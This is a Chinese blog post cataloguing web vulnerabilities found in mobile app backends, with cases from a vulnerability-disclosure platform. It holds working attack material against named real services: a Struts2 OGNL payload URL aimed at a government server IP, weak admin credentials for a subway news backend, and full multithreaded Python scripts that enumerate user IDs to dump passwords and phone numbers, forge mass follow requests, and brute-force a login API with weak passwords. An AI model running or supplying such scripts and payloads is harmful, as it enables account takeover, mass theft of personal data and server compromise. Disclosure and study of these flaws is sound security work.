# [移动App中常见的Web漏洞](https://www.cnblogs.com/dongchi/p/4466951.html)

主要是手机APP漏洞放在web端测试

智能手机的存在让网民的生活从PC端开始往移动端转向，现在网民的日常生活需求基本上一部手机就能解决。外卖，办公，社交，银行转账等等都能通过移动端App实现。那么随之也带来了很多信息安全问题，大量的用户信息储存在移动App中，由于移动App的开发并不健全，由移动App引发的用户信息泄露事件也层出不穷。

移动App中的Web型漏洞主要分为以下几块：

 

### 1.SQL注入漏洞

 

这是一个不能再常见的漏洞类型了，由于App的特性，开发人员认为使用App时无法获取到详细URL等信息，所以忽视了App防注入的编写。

例如：

*[糗事百科某处SQL注入可导致1500w用户信息泄露](http://loudong.360.cn/vul/info/qid/QTVA-2015-177818)*

*[全峰快递注入漏洞，可直接建服务器用户，各种订单用户数据泄露](http://loudong.360.cn/vul/info/qid/QTVA-2014-106574)*

*[永辉超市Appsql注入导致超市及用户信息泄露]( http://loudong.360.cn/vul/info/qid/QTVA-2014-106385)*

*[社交App“小湿妹”某处洞洞，数据库沦陷](http://loudong.360.cn/vul/info/qid/QTVA-2015-179315)*

*[提升逼格的App“交换”数据库沦陷，用户信息泄露](http://loudong.360.cn/vul/info/qid/QTVA-2015-177968)*

 

这些漏洞都是由于App开发中忽视了接口可能存在SQL注入问题，其中也包括POST注入，GET注入，COOKIE注入等等。

> 拿糗事百科注入详细举例

在查询用户详细信息时抓包，包内容如下：

```
GET /user/6122886/detail?rqcnt=12&r=dec363d71423481245949 HTTP/1.1    
User-Agent: qiushibalke_6.2.0_WIFI_auto_7    
Source: android_6.2.0    
Model: Xiaomi/cancro_wc_lte/cancro:4.4.4/KTU84P/V6.3.3.0.KXDCNBL:user/release-keys    
Qbtoken: 929efcfa9875f584f9f4db17343d16d7b1ec404b    
Uuid: IMEI_2af2c2beee1dbd00d3436cffdec363d7    
Deviceidinfo: {
"DEVICEID":"99000566573203",
"RANDOM":"",
"ANDROID_ID":"2e6990c574abdd57",
"SIMNO":"89860313100285780111'",
"IMSI":"460031219452851",
"SERIAL":"5d999491",
"MAC":"0c:1d:af:db:07:9c",
"SDK_INT":19
}    
Host: nearby.qiushibaike.com    
Connection: Keep-Alive    
Accept-Encoding: gzip
```

其中Qbtoken参数存在注入

*![img](http://p0.qhimg.com/t0130f86f415441deee.jpg)*



### 2.任意用户注册漏洞

此类漏洞并不危害到用户信息泄露，但是别有用心的黑客可能会利用此漏洞注册任意手机号码，并利用此注册账号去社工号码主人的朋友或者家人。

漏洞案例：

*[App“tataufo”某处漏洞可修改任意用户密码](http://loudong.360.cn/vul/info/qid/QTVA-2015-192209)*

*[App“约饭”任意用户注册](http://loudong.360.cn/vul/info/qid/QTVA-2015-193610)*

*[App“楼楼”任意用户注册](http://loudong.360.cn/vul/info/qid/QTVA-2015-193622)*

 

任意用户注册漏洞中大部分是由于验证码机制不健全和注册过程验证不严谨，其中App“约饭”任意用户注册中

发送注册请求后直接返回了验证码值。

 

![img](http://p0.qhimg.com/t0179fc1370cf57f111.png)

而App“楼楼”任意用户注册中，注册流程分为四个步骤

(1).注册用户，填写手机号，发送接收验证码请求。

(2).接收验证码，并填写。

(3).填写并验证验证码，进入填写资料步骤。

(4).填写用户资料，完成注册。

而这里在第四个步骤中出现了问题，前三步正常操作，在第四步时将资料中的号码改为任意手机号即能实现任意用户注册。

 

[![img](http://p0.qhimg.com/t01a868ee5eec69ad2b.png)](http://p0.qhimg.com/t01a868ee5eec69ad2b.png)

 

### 3.用户信息泄露

这种类型的漏洞多在用户资料查阅处存在，由于编写不严谨，在查询用户资料时会返回用户隐私信息，如账号邮箱，手机，密码等。

如：

*[App“叽友”泄露用户信息](http://loudong.360.cn/vul/info/qid/QTVA-2015-193589)*

*[Duang~App“小柚”用户信息泄露附验证脚本（密码，邮箱，手机号）](http://loudong.360.cn/vul/info/qid/QTVA-2015-187508)*

*[糗事百科某处泄露用户信息](http://loudong.360.cn/vul/info/qid/QTVA-2015-177827)*

拿App“小柚”举例

[![img](http://p0.qhimg.com/t01a4986ea5876149a8.png)](http://p0.qhimg.com/t01a4986ea5876149a8.png)

 

访问用户资料直接返回一些敏感信息，密码，邮箱，手机号

写个Python脚本来dump用户信息

```python
#!/usr/bin/env python
# _*_ coding: utf-8 _*_ 
# author=Hydra_Tc
# create=20150227

import os
import json
import random
import requests
import threadpool as tp

def baopo():
    flag = 0
    userid = 0
    while True:
        flag += 1
        userid += 1
        data = {'userid' : userid,}
        api_url = 'http://App.hixiaoyou.com/User/Me/getuserinfo'
        my_string = "userid"
        try:
            print '[%s] Test Userid: %s' % (flag, userid)
            req = requests.post(api_url, data=data, timeout=5)
            req_id = json.loads(req.content)['userid']
            req_mail = json.loads(req.content)['email']
            req_mobile = json.loads(req.content)['mobile']
            req_qq = json.loads(req.content)['QQ']
            req_pass = json.loads(req.content)['password']
        except:
            req_status = 0
        if my_string in req.json():
            success_f = open('./success_user1.txt', 'a+')
            success_f.write('%s--%s--%s--%s--%s\n'%(req_id,req_qq,req_mobile,req_mail,req_pass))
            success_f.close()

                      
if __name__ == '__main__':
    baopo()
    pool = tp.ThreadPool(100)
    reqs = tp.makeRequests(baopo)
    [pool.putRequest(req) for req in reqs]
    pool.wait()
```

结果如下


![img](http://p0.qhimg.com/t017bf76ef8380f3f14.png)


![img](http://p0.qhimg.com/t017e83dbd23a2845c2.png)


### 4.框架问题（st2等）

这个并不多但也不容忽视

*[国家统计局手机网站新闻管理系统两处漏洞](http://loudong.360.cn/vul/info/qid/QTVA-2014-113456)*

*[App“将爱”某漏洞可致服务器沦陷，泄露用户信息](http://loudong.360.cn/vul/info/qid/QTVA-2015-193592)*

国家统计局手机新闻管理系统漏洞如下：

![img](http://p0.qhimg.com/t011af6dd11de3a7129.jpg)

```
http://219.235.129.108:8080/NewManager/admin/login.action?redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D
```

 

### 5.后台弱口令

由于App站点URL信息并不是很明显，所以管理在设置后台路径和密码方面也显得比较随意

如：

*[北京市地铁站新闻后台管理系统沦陷](http://loudong.360.cn/vul/info/qid/QTVA-2014-124853)*

抓包得到

http://119.254.65.181/SubwayManagement/webservice/SubwayService

往上跨目录得到

http://119.254.65.181/SubwayManagement/和http://119.254.65.181/

两个后台系统，前者存在弱口令admin admin 和 admin beijingditieAppadmin


![img](http://p0.qhimg.com/t01eadd6bc448e76c9d.png)


### 6.越权漏洞

这个漏洞出现率仅次于SQL注入

*[App“逗萌”某处设计不当（附验证脚本）](http://loudong.360.cn/vul/info/qid/QTVA-2015-192485)*

*[社交App“足记”漏洞打包](http://loudong.360.cn/vul/info/qid/QTVA-2015-178379)*

*[App“tataufo”某处漏洞可修改任意用户密码](http://loudong.360.cn/vul/info/qid/QTVA-2015-192209)*



 

拿App“逗萌”某处设计不当为例

在App中对用户添加关注处没有任何验证

![img](http://p0.qhimg.com/t01c1ca3183614ce101.png)

```
POST /HC_AppClient/client-method/followUser.json HTTP/1.1    
Content-Length: 39    
Content-Type: Application/x-www-form-urlencoded    
Host: 115.29.5.49:80    
Connection: Keep-Alive    
User-Agent: Apache-HttpClient/UNAVAILABLE (java 1.4)     
fromUserId=14004049&toUserId=1398055700
```

 

写了个脚本开始刷粉丝

```python
#!/usr/bin/env python
# _*_ coding: utf-8 _*_ 
# author=Hydra_Tc
# create=20150306

import os
import json
import random
import requests
import threadpool as tp

def baopo():
    flag = 1
    fromUserId = 13980556
    while True:
        flag += 1
        fromUserId += 1
        data = {'fromUserId' : fromUserId,
                        'toUserId' : '13980556',}
        api_url = 'http://115.29.5.49/HC_APPClient/client-method/followUser.json'
        my_string = "body"
        try:
                print '[%s] Test Userid: %s' % (flag, fromUserId)
                req = requests.post(api_url, data=data, timeout=5)
        except:
                req_status = 0
        if my_string in req.json():
                success_f = open('./success_user1.txt', 'a+')
                success_f.write('%s\n'%(fromUserId))
                success_f.close()
                      
if __name__ == '__main__':
    baopo()
    pool = tp.ThreadPool(100)
    reqs = tp.makeRequests(baopo)
    [pool.putRequest(req) for req in reqs]
    pool.wait()

```

[![img](http://p0.qhimg.com/t01362831f4b6c32a61.jpg)](http://p0.qhimg.com/t01362831f4b6c32a61.jpg)

[![img](http://p0.qhimg.com/t01b6983d4db26ac951.png)](http://p0.qhimg.com/t01b6983d4db26ac951.png)

[![img](http://p0.qhimg.com/t01f49299cc2180454f.png)](http://p0.qhimg.com/t01f49299cc2180454f.png)

 

### 7.接口未限制导致撞库

其实这个我也是看到蘑菇牛发的没拍漏洞才开始注意此类型漏洞的，运气还算不错，两三天就找到个同类型的、

*[App“疯拍”两处漏洞打包，附验证脚本](http://loudong.360.cn/vul/info/qid/QTVA-2015-185861)*



疯拍存在两处漏洞，此处只举例接口未限制导致撞库

我用一个未注册手机号登陆返回提示

```json
{"success":false,"error":"\u8be5\u53f7\u7801\u5c1a\u672a\u6ce8\u518c\uff0c\u8bf7\u5148\u6ce8\u518c"}
{"success":false,"error":"该号码尚未注册，请先注册"}
```

 

提示尚未注册，用注册的用户登陆。

若密码错误，则会提示

```json
{"success":false,"error":"\u5bc6\u7801\u9519\u8bef\uff0c\u518d\u4ed4\u7ec6\u60f3\u60f3"}
{"success":false,"error":"密码错误，再仔细想想"}
```

若密码正确

```json
{
  "success": true,
  "data": {
    "data": {
      "ucookie": "19151821c062f8a0252dc3a951940b8dc5a238188447a260b145e1e40fc3d48d9",
      "username": "1234566666",
      "avatar": "",
      "level": 0,
      "score": 0,
      "setting": "{}",
      "uid": 16942,
      "nickname": "1234566666",
      "t": 1424918536
    },
    "expire": false
  }
}
```

 

此处内容包含cookie，等相关信息。那么我们在蘑菇的脚本上稍微加一些改动即可实现爆破。

脚本如下，加了注释

```python
#!/usr/bin/env python
# _*_ coding: utf-8 _*_ 
# author=Hydra_Tc
# create=20150224S

import json
import random
import requests
import threadpool as tp

def _burp(mobile): # 验证密码是否正确
    for password in ['qwertyu','123456', '123456789', '000000', mobile,'1234567','12345678','1234567890']: # 弱口令密码
        api_url = 'http://aifengpai.com/api/user/login'   # 登陆接口
        data = {'mobile': mobile,
                'did':'c71c53fa20c38d4a14ae8245bac9bb99',
                'password': password,}   # 登陆参数，这里简化了，去除了不必要的参数
        try:
            print '[*] Burp mobile: %s' % mobile
            req = requests.post(api_url, data=data, timeout=5) # requests模块的post请求
        except:
            continue
        try:
            success = json.loads(req.content)['data']
            burp_success = open('./fengpai_account.txt', 'a+') # 随机成功后生成该txt，并写成功数据
            burp_success.write('%s:::%s\n'%(mobile, password))
            burp_success.close()
            print success
            return success
        except:
            success = 0
            print '[-] Burp False'
            continue

def _status(args): # 判断手机号是否注册
        flag = 0
        list = "0123456789" 
        sa = []
        for i in range(8): #长度8,改了一下蘑菇牛的范围写法，自身测试感觉测试速度稍微加快了点
            sa.Append(random.choice(list))
        while True:
            flag += 1
            account_test = random.choice(['138','130','133','135','138','139','150','152','155','159','180','181','182','185','187','189'])\ # 手机号前几位
                                            +''.join(sa)
            data = {'mobile': account_test,
                    'did':'c71c53fa20c38d4a14ae8245bac9bb99',
                    'password': 'jhjhksd'}
            api_url = 'http://aifengpai.com/api/user/login'
            try:
                print '[%s] Test account: %s' % (flag, account_test)
                req = requests.post(api_url, data=data, timeout=3)
                req_status = json.loads(req.content)['error'] # 提取response里error处内容
            except:
                req_status = 0
            if req_status == u'\u5bc6\u7801\u9519\u8bef\uff0c\u518d\u4ed4\u7ec6\u60f3\u60f3': #两值相等则存在有该账号
                success_f = open('./fp_phone.txt', 'a+')
                success_f.write('%s\n'%account_test)
                success_f.close()
                _burp(account_test)
                print '\n[OK] account: %s\n' % account_test

if __name__ == '__main__':
        args = []
        for i in range(30):
            args.Append(args) 
        pool = tp.ThreadPool(30)
        reqs = tp.makeRequests(_status, args)
        [pool.putRequest(req) for req in reqs]
        pool.wait()
```

改了下蘑菇牛的随机数生成方式。

因为该App并没有像美拍那样拥有很多用户所以爆破起来有点难，所以我在测试的时候把，测试范围函数里的list改为了

```
list = "8"
```

手机前三位改为了

```
account_test = random.choice(['138'])\ # 手机号前几位
```

这样只会生成13888888888（这个号码提交之前测试时候注册过）

进行爆破结果如下

[![img](http://p0.qhimg.com/t0185f66c654ca00c0b.png)](http://p0.qhimg.com/t0185f66c654ca00c0b.png)

 